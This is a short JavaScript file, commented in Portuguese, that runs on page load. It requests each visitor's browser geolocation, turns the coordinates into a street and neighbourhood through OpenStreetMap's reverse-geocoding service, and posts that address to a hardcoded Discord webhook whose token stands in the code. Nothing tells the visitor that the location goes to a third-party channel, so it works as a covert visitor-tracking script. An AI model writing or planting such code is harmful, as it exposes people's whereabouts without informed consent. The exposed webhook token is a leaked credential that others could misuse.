// Função para enviar mensagem para o Discord via webhook
function enviarMensagemDiscord(mensagem) {
    const webhookURL = 'https://discord.com/api/webhooks/1205519125603160094/ocwJ60PohJEbl0oUCKSKAg6FAIMeg6Rjn_YU64Atfun0JFOtJOfD3kuwMNlO8Xb8WAST'; // Substitua pelo URL do seu webhook do Discord
    
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ content: mensagem }),
    })
    .then(response => console.log('Mensagem enviada para o Discord'))
    .catch(error => console.error('Erro ao enviar mensagem para o Discord:', error));
  }
  
  // Função para obter a localização do usuário e enviar mensagem para o Discord
  function obterLocalizacaoEEnviarMensagem() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(posicao => {
        const latitude = posicao.coords.latitude;
        const longitude = posicao.coords.longitude;
  
        // Chamada para API de geocodificação reversa para obter detalhes do endereço
        const apiURL = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;
  
        fetch(apiURL)
          .then(response => response.json())
          .then(data => {
            let endereco = data.display_name;
            if (data.address && data.address.road) {
              endereco = data.address.road;
              if (data.address.suburb) {
                endereco += ', ' + data.address.suburb;
              } else if (data.address.neighbourhood) {
                endereco += ', ' + data.address.neighbourhood;
              }
            } else if (data.address && data.address.suburb) {
              endereco = data.address.suburb;
            } else if (data.address && data.address.neighbourhood) {
              endereco = data.address.neighbourhood;
            } else {
              endereco = data.address.city;
            }
  
            // Montar mensagem com endereço e IP
            const mensagem = `Nova pessoa acessou o site em aproximadamente: ${endereco} na cidade de ${data.address.city}`;
  
            // Enviar mensagem para o Discord
            enviarMensagemDiscord(mensagem);
          })
          .catch(error => {
            console.error("Erro ao obter o endereço:", error);
          });
      });
    } else {
      console.log("Geolocalização não é suportada neste navegador.");
    }
  }
  
  // Chamar a função para obter a localização e enviar mensagem quando o documento estiver pronto
  document.addEventListener("DOMContentLoaded", obterLocalizacaoEEnviarMensagem);
  
